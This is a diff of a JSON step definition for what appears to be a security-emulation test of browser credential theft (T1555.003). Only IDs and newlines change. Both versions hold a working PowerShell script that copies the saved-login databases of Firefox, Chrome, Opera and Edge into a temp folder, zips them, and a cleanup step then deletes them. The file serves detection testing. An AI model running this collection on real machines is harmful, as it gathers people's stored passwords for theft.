@@ -7,19 +7,19 @@
   ],
   "steps": [
     {
-      "id": "b0add1c8-9f22-48be-8ff9-0cbb4ef289b1",
+      "id": "9a3aef3a-7229-4951-8ada-288cb09f31c1",
       "type": "execute-command",
       "data": {
-        "command": "$exfil_folder = \"$env:temp\\T1555.003\"\nif (test-path \"$exfil_folder\") {} else {new-item -path \"$env:temp\" -Name \"T1555.003\" -ItemType \"directory\" -force}\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$exfil_folder\\T1555.003Firefox_key4.db\"} else {}\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$exfil_folder\\T1555.003Firefox_logins.json\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data For Account\"} else {}\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$exfil_folder\\T1555.003Opera_Login Data\"} else {}\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$exfil_folder\\T1555.003Edge_Login Data\"} else {} \ncompress-archive -path \"$exfil_folder\" -destinationpath \"$exfil_folder.zip\" -force\n",
+        "command": "$exfil_folder = \"$env:temp\\T1555.003\"\nif (test-path \"$exfil_folder\") {} else {new-item -path \"$env:temp\" -Name \"T1555.003\" -ItemType \"directory\" -force}\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$exfil_folder\\T1555.003Firefox_key4.db\"} else {}\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$exfil_folder\\T1555.003Firefox_logins.json\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data For Account\"} else {}\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$exfil_folder\\T1555.003Opera_Login Data\"} else {}\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$exfil_folder\\T1555.003Edge_Login Data\"} else {} \ncompress-archive -path \"$exfil_folder\" -destinationpath \"$exfil_folder.zip\" -force",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "129a189c-0d04-42fb-b41f-5926d1b42789",
+      "id": "2ee49a7e-0901-447d-bdbf-088dfcfce3e6",
       "type": "execute-command",
       "data": {
-        "command": "Remove-Item -Path \"$env:temp\\T1555.003.zip\" -force -erroraction silentlycontinue   \nRemove-Item -Path \"$env:temp\\T1555.003\\\" -force -recurse -erroraction silentlycontinue\n",
+        "command": "Remove-Item -Path \"$env:temp\\T1555.003.zip\" -force -erroraction silentlycontinue   \nRemove-Item -Path \"$env:temp\\T1555.003\\\" -force -recurse -erroraction silentlycontinue",
         "command_type": "powershell"
       },
       "elevation_required": false
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "b0add1c8-9f22-48be-8ff9-0cbb4ef289b1",
+      "s": "9a3aef3a-7229-4951-8ada-288cb09f31c1",
       "p": "on-success",
-      "o": "129a189c-0d04-42fb-b41f-5926d1b42789"
+      "o": "2ee49a7e-0901-447d-bdbf-088dfcfce3e6"
     },
     {
-      "s": "b0add1c8-9f22-48be-8ff9-0cbb4ef289b1",
+      "s": "9a3aef3a-7229-4951-8ada-288cb09f31c1",
       "p": "on-failure",
-      "o": "129a189c-0d04-42fb-b41f-5926d1b42789"
+      "o": "2ee49a7e-0901-447d-bdbf-088dfcfce3e6"
     }
   ],
   "tags": [
